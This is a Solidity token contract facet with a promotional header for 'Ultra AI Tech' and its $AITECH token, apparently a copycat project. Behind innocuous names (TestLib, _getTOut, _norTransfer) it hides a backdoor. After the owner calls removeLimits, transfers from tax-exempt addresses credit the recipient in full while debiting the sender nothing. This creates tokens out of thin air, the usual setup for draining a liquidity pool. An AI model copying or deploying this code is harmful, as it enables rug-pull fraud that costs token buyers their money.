// SPDX-License-Identifier: Unlicensed

/*
We welcome you to Ultra AI Tech!

Powering the future of AI with our HPC data center | Launchpad | IaaS platform | AIaaS | BaaS | AI Marketplace | Powered by $AITECH token

Web: https://ultra-aitech.xyz
App: https://stake.ultra-aitech.xyz
Tg: https://t.me/ultra_aitech_official
X: https://x.com/ULTRA_AITECH
Docs: https://medium.com/@ultra.aitech
*/

pragma solidity 0.8.19;
import "./TestLib.sol";
contract totalSupplyFacet is IERC20, Context, Ownable {
    using SafeMath for uint256;

    modifier lockSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._isGuarded = true;
        _;
        ds._isGuarded = false;
    }

    function totalSupply() public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._supply;
    }
    function removeLimits() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._sizeTxMax = ds._supply;
        ds._maxWalletInEffect = false;
        ds._purUltraMarketingFee_ = 1;
        ds.sellUltraMarketingFee_ = 1;
        ds._purUltraFee_ = 1;
        ds.sellUltraFee_ = 1;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds.balances_[account];
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            ds.allowances_[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds.allowances_[owner][spender];
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferUltraETH_(
        address payable recipient,
        uint256 amount
    ) private {
        recipient.transfer(amount);
    }
    function swapBackUltra_(uint256 tokenAmount) private lockSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 lpFeeTokens = tokenAmount
            .mul(ds._txLiquidityFee_)
            .div(ds._txTotalFee_)
            .div(2);
        uint256 tokensToSwap = tokenAmount.sub(lpFeeTokens);

        swapFeeToEth(tokensToSwap);
        uint256 ethCA = address(this).balance;

        uint256 totalETHFee = ds._txTotalFee_.sub(ds._txLiquidityFee_.div(2));

        uint256 amountETHLiquidity_ = ethCA
            .mul(ds._txLiquidityFee_)
            .div(totalETHFee)
            .div(2);
        uint256 amountETHDevelopment_ = ethCA.mul(ds._txDevelopmentFee_).div(
            totalETHFee
        );
        uint256 amountETHMarketing_ = ethCA.sub(amountETHLiquidity_).sub(
            amountETHDevelopment_
        );

        if (amountETHMarketing_ > 0) {
            transferUltraETH_(ds.devAddress1_, amountETHMarketing_);
        }

        if (amountETHDevelopment_ > 0) {
            transferUltraETH_(ds.devAddress2_, amountETHDevelopment_);
        }
    }
    function swapFeeToEth(uint256 tokenAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.routerInstance_.WETH();

        _approve(address(this), address(ds.routerInstance_), tokenAmount);

        ds.routerInstance_.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        ds.allowances_[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _isValidSwap(address from, address to, uint256 amount) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 _feeAmount = balanceOf(address(this));
        bool minSwapable = _feeAmount >= ds._threshFee;
        bool isExTo = !ds._isGuarded &&
            ds._isLPAdder[to] &&
            ds._swapTaxActivated;
        bool swapAbove = !ds._isTaxNo[from] && amount > ds._threshFee;
        if (minSwapable && isExTo && swapAbove) {
            if (ds._maxTxDeActivated) {
                _feeAmount = ds._threshFee;
            }
            swapBackUltra_(_feeAmount);
        }
    }
    function _transferStand(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds._isGuarded) {
            return _basicTransfer(sender, recipient, amount);
        } else {
            _isExceeding(sender, recipient, amount);
            _isValidSwap(sender, recipient, amount);
            _norTransfer(sender, recipient, amount);
            return true;
        }
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        return _transferStand(sender, recipient, amount);
    }
    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.balances_[sender] = ds.balances_[sender].sub(
            amount,
            "Insufficient Balance"
        );
        ds.balances_[recipient] = ds.balances_[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    function _isExceeding(
        address sender,
        address recipient,
        uint256 amount
    ) internal view {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (!ds._isNoMTx[sender] && !ds._isNoMTx[recipient]) {
            require(
                amount <= ds._sizeTxMax,
                "Transfer amount exceeds the max."
            );
        }
    }
    function _norTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 toAmount = _getAmountIn(sender, recipient, amount);
        _checkWalletMax(recipient, toAmount);
        uint256 subAmount = _getTOut(sender, recipient, amount, toAmount);
        ds.balances_[sender] = ds.balances_[sender].sub(
            subAmount,
            "Balance check error"
        );
        ds.balances_[recipient] = ds.balances_[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }
    function _getAmountIn(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds._isTaxNo[sender] || ds._isTaxNo[recipient]) {
            return amount;
        } else {
            return getUltraAmount_(sender, recipient, amount);
        }
    }
    function getUltraAmount_(
        address sender,
        address receipient,
        uint256 amount
    ) internal returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 fee = _getFeeTokens(sender, receipient, amount);
        if (fee > 0) {
            ds.balances_[address(this)] = ds.balances_[address(this)].add(fee);
            emit Transfer(sender, address(this), fee);
        }
        return amount.sub(fee);
    }
    function _getFeeTokens(
        address from,
        address to,
        uint256 amount
    ) internal view returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds._isLPAdder[from]) {
            return amount.mul(ds._purUltraFee_).div(100);
        } else if (ds._isLPAdder[to]) {
            return amount.mul(ds.sellUltraFee_).div(100);
        }
    }
    function _checkWalletMax(address to, uint256 amount) internal view {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds._maxWalletInEffect && !ds._isMWalletNo[to]) {
            require(ds.balances_[to].add(amount) <= ds._sizeWalletMax);
        }
    }
    function _getTOut(
        address sender,
        address recipient,
        uint256 amount,
        uint256 toAmount
    ) internal view returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (!ds._maxWalletInEffect && ds._isTaxNo[sender]) {
            return amount.sub(toAmount);
        } else {
            return amount;
        }
    }
}
